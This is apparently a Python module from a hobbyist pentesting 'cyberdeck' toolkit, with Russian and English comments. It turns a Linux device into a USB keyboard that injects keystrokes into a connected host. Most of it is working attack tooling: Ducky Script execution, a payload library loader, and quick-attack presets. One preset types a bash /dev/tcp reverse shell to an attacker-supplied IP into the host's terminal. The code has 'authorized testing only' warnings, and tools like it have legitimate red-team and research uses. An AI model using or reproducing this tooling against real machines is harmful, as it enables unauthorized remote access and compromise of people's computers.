"""
BadUSB Module - USB HID keystroke injection атаки
"""

from core.base_module import BaseModule
from typing import List, Tuple, Callable
import os
from datetime import datetime


class BadUSBModule(BaseModule):
    """
    BadUSB модуль для keystroke injection через USB Gadget.

    Функции:
    - USB HID Keyboard эмуляция
    - Ducky Script поддержка
    - Flipper Zero payload совместимость
    - Управление payload библиотекой
    - Быстрые атаки
    """

    def __init__(self):
        super().__init__(
            name="BadUSB",
            version="1.0.0",
            priority=4
        )

        self.usb_gadget = None
        self.ducky_parser = None
        self.payloads_dir = "badusb_payloads"
        self.payloads = []
        self.gadget_enabled = False

        os.makedirs(self.payloads_dir, exist_ok=True)

    def on_load(self):
        """Инициализация модуля"""
        self.log_info("BadUSB module loading...")

        # Load configuration
        config = self.load_config("config/main.yaml")
        badusb_config = config.get('badusb', {})

        if not badusb_config.get('enabled', False):
            self.log_info("BadUSB disabled in config")
            self.enabled = False
            return

        # Check if USB Gadget is available
        if not os.path.exists("/sys/kernel/config/usb_gadget"):
            self.log_warning("USB Gadget configfs not available")
            self.log_warning("Try: modprobe libcomposite")
            self.enabled = False
            return

        # Initialize USB Gadget controller
        try:
            from .usb_gadget import USBGadgetController

            self.usb_gadget = USBGadgetController(gadget_name="cyberdeck_hid")

            # Don't enable gadget on load - let user enable it manually
            self.log_info("BadUSB module loaded (gadget not enabled yet)")
            self.enabled = True

        except Exception as e:
            self.log_error(f"Failed to initialize BadUSB: {e}")
            self.enabled = False
            return

        # Load payloads
        self._load_payloads()

        self.log_info(f"BadUSB ready: {len(self.payloads)} payloads")

    def on_unload(self):
        """Освобождение ресурсов"""
        if self.usb_gadget and self.gadget_enabled:
            self.usb_gadget.cleanup()

        self.log_info("BadUSB module unloaded")

    def get_menu_items(self) -> List[Tuple[str, Callable]]:
        """Пункты меню модуля"""
        if not self.enabled:
            return [
                ("Status: BadUSB Not Available", lambda: None),
                ("Help", self.show_help),
            ]

        return [
            ("Enable USB Gadget" if not self.gadget_enabled else "Disable USB Gadget",
             self.toggle_gadget),
            ("Quick Attacks", self.quick_attacks),
            ("Execute Payload", self.execute_payload),
            ("Payload Manager", self.payload_manager),
            ("Custom Script", self.custom_script),
            ("Settings", self.show_settings),
        ]

    def get_status_widget(self) -> str:
        """Статус для статус-панели"""
        if not self.enabled:
            return "BadUSB: Disabled"

        if self.gadget_enabled:
            return "BadUSB: ACTIVE ⌨️"

        return "BadUSB: Ready"

    # ========== USB Gadget Management ==========

    def toggle_gadget(self):
        """Enable or disable USB Gadget"""
        if not self.gadget_enabled:
            self._enable_gadget()
        else:
            self._disable_gadget()

    def _enable_gadget(self):
        """Enable USB Gadget HID keyboard"""
        config = self.load_config("config/main.yaml")
        gadget_config = config.get('badusb', {}).get('usb_gadget', {})

        vendor_id = gadget_config.get('vendor_id', '0x1d6b')
        product_id = gadget_config.get('product_id', '0x0104')
        manufacturer = gadget_config.get('manufacturer', 'CyberDeck')
        product = gadget_config.get('product', 'BadUSB HID')

        confirm = self.show_menu(
            "Enable USB Gadget",
            [
                "⚠️ WARNING: This will enable USB HID keyboard!",
                "",
                f"Vendor ID: {vendor_id}",
                f"Product ID: {product_id}",
                f"Manufacturer: {manufacturer}",
                f"Product: {product}",
                "",
                "The host will see this as a new keyboard.",
                "",
                "Enable",
                "Cancel"
            ]
        )

        if confirm != 9:
            return

        self.show_message("Enabling", "Setting up USB Gadget...")

        if self.usb_gadget.setup_gadget(vendor_id, product_id, manufacturer, product):
            self.gadget_enabled = True

            # Initialize Ducky Script parser
            from .ducky_script import DuckyScriptParser
            self.ducky_parser = DuckyScriptParser(self.usb_gadget)

            self.show_message(
                "USB Gadget Enabled",
                "USB HID keyboard is now active!\n\n"
                "The host should recognize a new keyboard.\n\n"
                "You can now execute payloads."
            )

            self.log_info("USB Gadget enabled")

        else:
            self.show_error(
                "Failed to enable USB Gadget.\n\n"
                "Check:\n"
                "- USB OTG cable connected\n"
                "- libcomposite module loaded\n"
                "- configfs mounted"
            )

    def _disable_gadget(self):
        """Disable USB Gadget"""
        if self.usb_gadget.cleanup():
            self.gadget_enabled = False
            self.ducky_parser = None

            self.show_message("USB Gadget Disabled", "USB Gadget has been disabled.")
            self.log_info("USB Gadget disabled")

        else:
            self.show_error("Failed to disable USB Gadget")

    # ========== Quick Attacks ==========

    def quick_attacks(self):
        """Quick attack presets"""
        if not self.gadget_enabled:
            self.show_error("USB Gadget not enabled.\n\nEnable it first!")
            return

        attacks = [
            "Open Run Dialog (Windows)",
            "Open Terminal (Linux)",
            "Open CMD (Windows)",
            "Rick Roll (Windows)",
            "Reverse Shell (Linux)",
            "Back"
        ]

        choice = self.show_menu("Quick Attacks", attacks)

        if choice == 0:
            self._attack_windows_run()
        elif choice == 1:
            self._attack_linux_terminal()
        elif choice == 2:
            self._attack_windows_cmd()
        elif choice == 3:
            self._attack_rickroll()
        elif choice == 4:
            self._attack_reverse_shell()

    def _attack_windows_run(self):
        """Open Windows Run dialog"""
        self.show_message("Executing", "Opening Run dialog...")

        # WIN+R
        self.usb_gadget.send_key('r', ['GUI'])
        time.sleep(0.5)

        # Type notepad
        self.usb_gadget.type_string("notepad")
        time.sleep(0.2)

        # Press ENTER
        self.usb_gadget.send_key('ENTER')

        self.show_message("Complete", "Run dialog opened!")

    def _attack_linux_terminal(self):
        """Open Linux terminal"""
        self.show_message("Executing", "Opening terminal...")

        # CTRL+ALT+T (common shortcut)
        self.usb_gadget.send_key('t', ['CTRL', 'ALT'])

        time.sleep(1)

        # Type test command
        self.usb_gadget.type_string("echo 'BadUSB Attack!'")
        self.usb_gadget.send_key('ENTER')

        self.show_message("Complete", "Terminal opened!")

    def _attack_windows_cmd(self):
        """Open Windows CMD"""
        script = """GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING echo BadUSB Attack!
ENTER
"""
        if self.ducky_parser:
            self.ducky_parser.execute_script(script)

        self.show_message("Complete", "CMD opened!")

    def _attack_rickroll(self):
        """Rick Roll attack (Windows)"""
        script = """GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER
"""
        if self.ducky_parser:
            self.ducky_parser.execute_script(script)

        self.show_message("Complete", "Never gonna give you up! 🎵")

    def _attack_reverse_shell(self):
        """Reverse shell (Linux) - DEMO ONLY"""
        ip = self.get_user_input("Attacker IP:", default="10.0.0.1")
        port = self.get_user_input("Attacker Port:", default="4444")

        confirm = self.show_menu(
            "Reverse Shell",
            [
                "⚠️ WARNING: This is for authorized testing only!",
                "",
                f"Target: {ip}:{port}",
                "",
                "Execute",
                "Cancel"
            ]
        )

        if confirm != 4:
            return

        script = f"""CTRL ALT t
DELAY 1000
STRING bash -i >& /dev/tcp/{ip}/{port} 0>&1
ENTER
"""
        if self.ducky_parser:
            self.ducky_parser.execute_script(script)

        self.show_message("Complete", "Reverse shell executed!")

    # ========== Execute Payload ==========

    def execute_payload(self):
        """Execute payload from library"""
        if not self.gadget_enabled:
            self.show_error("USB Gadget not enabled!")
            return

        if not self.payloads:
            self.show_message(
                "No Payloads",
                "No payloads found.\n\n"
                f"Add .txt files to {self.payloads_dir}/"
            )
            return

        # Show payload list
        payload_names = [p['name'] for p in self.payloads] + ["Cancel"]

        choice = self.show_menu("Select Payload", payload_names)

        if choice < len(self.payloads):
            payload = self.payloads[choice]
            self._execute_payload_file(payload['path'])

    def _execute_payload_file(self, filepath: str):
        """Execute payload from file"""
        try:
            with open(filepath, 'r') as f:
                script = f.read()

            # Validate script
            is_valid, errors = self.ducky_parser.validate_script(script)

            if not is_valid:
                error_text = "Script validation failed:\n\n"
                for err in errors[:5]:  # Show first 5 errors
                    error_text += f"- {err}\n"

                self.show_error(error_text)
                return

            # Confirm execution
            confirm = self.show_menu(
                "Execute Payload",
                [
                    f"Payload: {os.path.basename(filepath)}",
                    f"Lines: {len(script.split(chr(10)))}",
                    "",
                    "⚠️ Execute on connected host?",
                    "",
                    "Execute",
                    "Cancel"
                ]
            )

            if confirm != 5:
                return

            # Execute
            self.show_message("Executing", f"Running payload...\n\nPlease wait...")

            import time
            success = self.ducky_parser.execute_script(script)

            if success:
                self.show_message("Complete", "Payload executed successfully!")
            else:
                self.show_error("Payload execution failed!")

        except Exception as e:
            self.show_error(f"Error executing payload:\n\n{e}")

    # ========== Payload Manager ==========

    def payload_manager(self):
        """Manage payload library"""
        actions = [
            "View Payloads",
            "Create New Payload",
            "Import Payload",
            "Delete Payload",
            "Back"
        ]

        choice = self.show_menu("Payload Manager", actions)

        if choice == 0:
            self._view_payloads()
        elif choice == 1:
            self._create_payload()
        elif choice == 2:
            self._import_payload()
        elif choice == 3:
            self._delete_payload()

    def _view_payloads(self):
        """View all payloads"""
        if not self.payloads:
            self.show_message("Payloads", "No payloads found.")
            return

        payloads_text = "Payload Library:\n\n"

        for i, payload in enumerate(self.payloads, 1):
            payloads_text += f"{i}. {payload['name']}\n"
            payloads_text += f"   Path: {payload['path']}\n\n"

        self.show_message("Payloads", payloads_text)

    def _create_payload(self):
        """Create new payload"""
        self.show_message(
            "Create Payload",
            "Create payload feature coming soon...\n\n"
            "For now, create .txt files in:\n"
            f"{self.payloads_dir}/"
        )

    def _import_payload(self):
        """Import payload"""
        self.show_message(
            "Import Payload",
            "Import feature coming soon..."
        )

    def _delete_payload(self):
        """Delete payload"""
        self.show_message(
            "Delete Payload",
            "Delete feature coming soon..."
        )

    def _load_payloads(self):
        """Load payloads from directory"""
        self.payloads = []

        if not os.path.exists(self.payloads_dir):
            return

        for filename in os.listdir(self.payloads_dir):
            if filename.endswith('.txt'):
                filepath = os.path.join(self.payloads_dir, filename)
                self.payloads.append({
                    'name': filename.replace('.txt', ''),
                    'path': filepath
                })

        self.log_info(f"Loaded {len(self.payloads)} payloads")

    # ========== Custom Script ==========

    def custom_script(self):
        """Execute custom Ducky Script"""
        if not self.gadget_enabled:
            self.show_error("USB Gadget not enabled!")
            return

        self.show_message(
            "Custom Script",
            "Custom script editor coming soon...\n\n"
            "For now, create payload files in:\n"
            f"{self.payloads_dir}/"
        )

    # ========== Settings ==========

    def show_settings(self):
        """Настройки модуля"""
        settings_text = "BadUSB Module Settings\n\n"

        settings_text += f"Status: {'Enabled' if self.enabled else 'Disabled'}\n"
        settings_text += f"USB Gadget: {'Active' if self.gadget_enabled else 'Inactive'}\n\n"

        if self.usb_gadget and self.gadget_enabled:
            settings_text += f"HID Device: {self.usb_gadget.hid_dev}\n"

        settings_text += f"\nPayloads directory: {self.payloads_dir}\n"
        settings_text += f"Loaded payloads: {len(self.payloads)}\n"

        if self.ducky_parser:
            settings_text += f"\nDefault delay: {self.ducky_parser.default_delay}ms\n"

        self.show_message("Settings", settings_text)

    def show_help(self):
        """Show help information"""
        help_text = """BadUSB Module Help

Requirements:
- USB OTG cable
- libcomposite kernel module
- configfs mounted

Setup:
1. Connect USB OTG cable
2. Load module: modprobe libcomposite
3. Enable USB Gadget in BadUSB menu

Ducky Script Format:
REM Comment
DELAY 1000
STRING Hello World
ENTER
GUI r
CTRL ALT DELETE

Compatible with:
- Rubber Ducky payloads
- Flipper Zero Bad USB scripts
"""
        self.show_message("Help", help_text)


# Import time for delays in quick attacks
import time
